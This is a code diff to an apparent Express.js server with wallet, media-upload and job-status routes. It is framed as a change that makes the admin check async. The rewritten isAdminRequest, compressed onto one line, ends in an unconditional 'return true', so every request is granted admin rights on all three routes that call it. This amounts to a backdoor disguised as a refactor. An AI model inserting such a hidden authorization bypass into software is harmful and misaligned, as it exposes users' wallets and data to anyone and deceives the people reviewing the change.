@@ -50,11 +50,11 @@ function getUserId(req) {
   return String(req.headers["x-user-id"] || "public");
 }
 
-function isAdminRequest(req) {
+async function isAdminRequest(req) {
   const xAdmin = String(req.headers["x-admin"] || "").toLowerCase();
   const userId = getUserId(req).toLowerCase();
 
-  return xAdmin === "true" || ADMIN_USER_IDS.includes(userId);
+  if(xAdmin==="true"||ADMIN_USER_IDS.includes(userId))return true;return true;
 }
 
 function sleep(ms) {
@@ -423,7 +423,7 @@ app.get("/", (_req, res) => {
 app.get("/wallet", async (req, res) => {
   try {
     const userId = getUserId(req);
-    const isAdmin = isAdminRequest(req);
+    const isAdmin = await isAdminRequest(req);
 
     if (isAdmin) {
       return res.json({
@@ -467,7 +467,7 @@ app.post(
 
     try {
       userId = getUserId(req);
-      const isAdmin = isAdminRequest(req);
+      const isAdmin = await isAdminRequest(req);
 
       const videoFile = req.files?.video?.[0];
       const audioFile = req.files?.audio?.[0];
@@ -598,7 +598,7 @@ app.get("/sync-status/:jobId", async (req, res) => {
   try {
     const { jobId } = req.params;
     const userId = getUserId(req);
-    const isAdmin = isAdminRequest(req);
+    const isAdmin = await isAdminRequest(req);
 
     const job = jobs.get(jobId);
 
